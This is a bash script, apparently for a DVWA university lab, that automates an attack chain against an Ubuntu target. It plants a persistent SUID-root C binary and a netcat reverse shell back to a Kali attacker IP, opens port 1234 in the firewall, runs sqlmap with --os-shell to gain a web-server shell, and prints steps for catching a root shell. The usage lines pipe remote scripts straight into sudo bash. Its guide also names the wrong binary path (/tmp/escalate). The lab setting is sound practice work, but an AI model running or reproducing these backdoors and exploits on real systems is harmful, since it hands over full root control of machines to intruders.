#!/bin/bash
# Script Name: dvwa-peas.sh
# Description: Automates privilege escalation setup on a DVWA Ubuntu VM and guides the user through the exploit.
#
# === Usage Instructions ===
#
# --- For Ubuntu DVWA VM (The Target) ---
#
# Set up the SUID binary and reverse shell script:
#   wget https://raw.githubusercontent.com/harshagv/pythonWorks/refs/heads/master/usyd/scripts-library/dvwa-peas.sh && sudo bash dvwa-peas.sh suid_setup
#
# Download and run the linPEAS privilege escalation scanner:
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/refs/heads/master/usyd/scripts-library/dvwa-peas.sh | sudo bash -s peas_scan
#
# --- For Kali VM (The Attacker) ---
#
# Get the initial www-data shell via sqlmap (prerequisite):
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/refs/heads/master/usyd/scripts-library/dvwa-peas.sh | DVWA_PHPSESSID=<PHPSESSID> DVWA_TARGET_URL="http://<IP>" sudo -E bash -s kali_get_os_shell
#
# Display instructions on how to trigger the exploit and catch the root shell:
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/refs/heads/master/usyd/scripts-library/dvwa-peas.sh | sudo bash -s kali_trigger_exploit
#

# --- Script Configuration ---
LOGFILE="$(pwd)/dvwa-peas-$(date +"%Y%m%d-%H%M%S").log"
exec > >(tee -a "$LOGFILE") 2>&1

set -euo pipefail
IFS=$'\n\t'

# === ASCII Art Banner & Color Constants ===
echo ""
echo "##################################################################################"

echo "#                                                                                #"
echo "#                     DVWA Privilege Escalation Automation Suite (PEAS)          #"
echo "##################################################################################"
echo ""
RESET="\033[0m"; GREEN="\033[1;32m"; RED="\033[1;31m"; YELLOW="\033[1;33m"; CYAN="\033[1;36m"; PINK="\033[1;35m"

# === Helper Functions ===
print_info() { echo -e "${CYAN}[INFO]${RESET} $1"; }
print_success() { echo -e "${GREEN}[SUCCESS]${RESET} $1"; }
print_warn() { echo -e "${YELLOW}[WARNING]${RESET} $1"; }
print_error() { echo -e "${RED}[ERROR]${RESET} $1 ❌"; }
print_title() { echo -e "\n${PINK}=== $1 ===${RESET}\n"; }

cleanup() {
  local exit_code=$?
  if [ $exit_code -ne 0 ]; then print_error "Script exited with error code: $exit_code"; fi
  print_info "Cleaning up before exit."
}
trap cleanup EXIT
handle_interrupt() { print_error "Script interrupted by user (SIGINT)" >&2; exit 130; }
trap handle_interrupt INT

### === UBUNTU VM FUNCTIONS (TARGET) === ###

ubuntu_setup_suid_escalation() {
    print_title "Setting Up PERSISTENT SUID Privilege Escalation Binaries"

    # Allow Privilege Escalation to port by UFW
    sudo ufw allow 1234/tcp
    
    # --- Step 1: Define a Persistent, Secure Path ---
    local EXPLOIT_DIR="/opt/escalation_tools"
    print_info "Using persistent directory for exploit files: ${EXPLOIT_DIR}"
    mkdir -p "$EXPLOIT_DIR"

    # --- Step 2: Get Attacker IP for the Reverse Shell ---
    local KALI_HOST_IP
    echo -ne "\e[96mEnter your Kali VM's IP address (for the reverse shell): \e[0m"
    read -p "" KALI_HOST_IP
    if [ -z "$KALI_HOST_IP" ]; then
        print_error "Kali IP address cannot be empty. Aborting."
        exit 1
    fi
    print_info "Reverse shell will connect back to: ${KALI_HOST_IP}"
    echo ""

    # --- Step 3: Create the C Program for Escalation ---
    local C_SOURCE_FILE="${EXPLOIT_DIR}/escalate.c"
    local C_BINARY_FILE="${EXPLOIT_DIR}/escalate"
    print_info "Creating C source file at ${C_SOURCE_FILE}..."
    tee "$C_SOURCE_FILE" > /dev/null <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(void) {
    setuid(0);
    setgid(0);
    system("/bin/bash ${EXPLOIT_DIR}/im_root.sh");
    return 0;
}
EOF
    print_success "C source file created."

    # --- Step 4: Compile the Program ---
    print_info "Compiling ${C_SOURCE_FILE} into ${C_BINARY_FILE}..."
    if ! command -v gcc &> /dev/null; then
        print_warn "gcc not found. Installing 'build-essential' package..."
        apt-get update && apt-get install -y build-essential
    fi
    if gcc -o "$C_BINARY_FILE" "$C_SOURCE_FILE"; then
        print_success "Compilation successful."
    else
        print_error "Compilation failed. Please check for errors."
        exit 1
    fi

    # --- Step 5: Set Ownership and SUID Permissions ---
    print_info "Setting ownership and permissions on the 'escalate' binary..."
    chown root:users "$C_BINARY_FILE"
    chmod u+x "$C_BINARY_FILE"
    chmod ug+s "$C_BINARY_FILE" # Set SUID and SGID
    print_success "Ownership set to 'root:users' and SUID bit set."
    ls -l "$C_BINARY_FILE" # Show the result for verification

    # --- Step 6: Create the Reverse Shell Script ---
    local REVERSE_SHELL_SCRIPT="${EXPLOIT_DIR}/im_root.sh"
    print_info "Creating reverse shell script at ${REVERSE_SHELL_SCRIPT}..."
    tee "$REVERSE_SHELL_SCRIPT" > /dev/null <<EOF
#!/bin/bash
# This script creates a reverse shell back to the attacker (Kali VM).
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc ${KALI_HOST_IP} 1234 > /tmp/f
EOF
    chmod +x "$REVERSE_SHELL_SCRIPT"
    print_success "Reverse shell script created and made executable."
    
    print_title "Persistent SUID Escalation Setup Complete"
    print_info "The exploit files are now located in ${EXPLOIT_DIR} and will survive a reboot."
    print_info "When you get your www-data shell, run the following command to trigger the exploit:"
    echo -e "${GREEN}${EXPLOIT_DIR}/escalate${RESET}"
}

ubuntu_run_peas_scan() {
    print_title "Running linPEAS Privilege Escalation Scanner"
    
    local PEAS_URL="https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
    local PEAS_SCRIPT_PATH="/tmp/linpeas.sh"
    local PEAS_REPORT_PATH="/tmp/linpeas_scan_report.txt"

    print_info "Downloading the latest linpeas.sh script..."
    if wget -q "$PEAS_URL" -O "$PEAS_SCRIPT_PATH"; then
        print_success "linpeas.sh downloaded to ${PEAS_SCRIPT_PATH}."
    else
        print_error "Failed to download linpeas.sh. Check network connection or URL."
        exit 1
    fi
    
    chmod +x "$PEAS_SCRIPT_PATH"

    print_info "Running linPEAS scan as root. This may take a few minutes..."
    print_warn "Full color-coded output will be saved to ${PEAS_REPORT_PATH}."
    
    # Run the script and save its output
    bash "$PEAS_SCRIPT_PATH" > "$PEAS_REPORT_PATH"
    
    print_success "linPEAS scan complete."
    print_info "To review the report, run the following command on your Ubuntu VM:"
    echo -e "${GREEN}less -R ${PEAS_REPORT_PATH}${RESET}"
    print_info "Inside 'less', you can search for keywords like 'WARNING' or 'privilege' by typing '/' followed by the word and pressing Enter."
}

### === KALI VM FUNCTIONS (ATTACKER) === ###

kali_exploit_sqlmap_os_shell() {
    # This function is included from the previous script to make this one self-contained.
    print_title "Running SQLmap OS Shell Exploitation"

    # Check required variables
    if [ -z "${DVWA_TARGET_URL:-}" ]; then print_error "DVWA_TARGET_URL not set."; exit 1; fi
    if [ -z "${DVWA_PHPSESSID:-}" ]; then print_error "DVWA_PHPSESSID not set."; exit 1; fi

    # Show config info
    print_info "Using DVWA Target URL: ${DVWA_TARGET_URL}"
    print_info "Using PHPSESSID: ${DVWA_PHPSESSID}"

    # Define paths and variables
    local TARGET="${DVWA_TARGET_URL%/}"
    local PHPSESSID="$DVWA_PHPSESSID"
    local TARGET_USER=$(logname 2>/dev/null || echo "$SUDO_USER")
    local USER_HOME=$(eval echo "~${TARGET_USER}")
    local OUTDIR="${USER_HOME}/scans/dvwa/os_shell_root"

    # Prepare output directory
    sudo mkdir -p "$OUTDIR"
    sudo chown -R "$TARGET_USER":"$TARGET_USER" "$OUTDIR"

    # Warnings
    print_warn "This requires DVWA security 'Low', a vulnerable MySQL backend, and a world-writable web directory."

    # Construct updated sqlmap arguments (surgically replaced)
    local SQLI_URL="${TARGET}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
    local COOKIE_STRING="Cookie: security=low; PHPSESSID=${PHPSESSID}"
    declare -a SQLMAP_BASE_ARGS=(
        -u "${SQLI_URL}"
        -H "${COOKIE_STRING}"
        --batch
        --flush-session
        --level=5
        --risk=3
        --dbs
        --dbms="mysql"
        --os="Linux"
        --random-agent
        --web-root="/var/www/html/dvwa"
        --output-dir="${OUTDIR}"
        --os-shell
    )

    # Run the updated sqlmap command
    print_info "Attempting to get initial 'www-data' shell using SQLmap.."
    print_info "Running sqlmap ${SQLMAP_BASE_ARGS[@]} command"
    sudo -u "$TARGET_USER" sqlmap "${SQLMAP_BASE_ARGS[@]}" | tee "${OUTDIR}/sqlmap_os_shell.log"

    # Post-execution messages
    print_success "SQLmap OS shell process finished. If successful, you should have an interactive shell."
    print_warn "If the shell did not spawn, check the logs in ${OUTDIR} for errors."
}

guide_trigger_escalation() {
    print_title "Guide: Triggering the Privilege Escalation"
    print_info "This process requires two terminals: one on your Kali VM and one in your active sqlmap shell."

    print_info "\n--- Step 1: On your KALI VM (Attacker) ---"
    print_info "Open a new terminal and start a netcat listener to catch the incoming root shell."
    print_info "Run this exact command:"
    echo -e "${GREEN}nc -lvnp 1234${RESET}"
    print_warn "Your terminal will now be waiting. Do not close it."
    
    print_info "\n--- Step 2: In your SQLMAP OS SHELL (The www-data shell on the Target) ---"
    print_info "You should already have an OS shell from running the 'kali_get_os_shell' command."
    print_info "First, verify you are the 'www-data' user by typing:"
    echo -e "${GREEN}whoami${RESET}"
    print_info "Now, execute the SUID binary you created earlier:"
    echo -e "${GREEN}/tmp/escalate${RESET}"

    print_info "\n--- Step 3: Check your KALI VM Netcat Listener ---"
    print_success "If successful, your netcat listener terminal will now be an interactive ROOT SHELL on the Ubuntu VM!"
    print_info "To verify, type 'whoami' in the netcat terminal. The output should be:"
    echo -e "${RED}root${RESET}"
    print_info "You now have full control of the target machine."
}

# === MAIN LOGIC ===
case "${1:-}" in
    "suid_setup")
        ubuntu_setup_suid_escalation
        ;;
    "peas_scan")
        ubuntu_run_peas_scan
        ;;
    "kali_get_os_shell")
        kali_exploit_sqlmap_os_shell
        ;;
    "kali_trigger_exploit")
        guide_trigger_escalation
        ;;
    *)
        print_error "Invalid argument: '${1:-}'"
        echo "Usage: wget -qO- <script_url> | sudo [-E] bash -s <argument>"
        echo ""
        echo "Arguments for Ubuntu DVWA VM (Target):"
        echo "  suid_setup      : Creates the SUID binary and reverse shell script for privilege escalation."
        echo "  peas_scan       : Downloads and runs the linPEAS host scanner."
        echo ""
        echo "Arguments for Kali VM (Attacker):"
        echo "  kali_get_os_shell  : Runs sqlmap to get the initial www-data OS shell."
        echo "  kali_trigger_exploit : Shows instructions on how to use the exploit and catch the root shell."
        exit 1
        ;;
esac
